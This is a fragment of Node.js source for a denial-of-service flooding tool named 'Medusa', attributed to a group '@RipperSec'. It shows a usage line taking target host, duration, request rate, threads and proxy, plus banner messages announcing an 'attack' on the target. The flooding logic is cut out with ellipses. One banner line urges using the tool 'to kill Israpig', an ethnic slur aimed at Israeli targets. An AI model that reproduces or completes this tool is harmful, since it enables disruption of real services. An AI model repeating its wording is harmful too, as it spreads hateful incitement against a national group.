const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node Medusa <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));}
 if (process.argv.length < 7){console.log(gradient.vice(`(@RipperSec) Use to kill Israpig.`));}
 const headers = {};
...
console.log('\x1b[36m%s\x1b[0m', `Medusa Killing!`);
console.log(`[Info] Starting ${time} seconds attack on ${target} with ${threads} threads`);
 console.log('\x1b[32m%s\x1b[0m',`Tools By @RipperSec`);
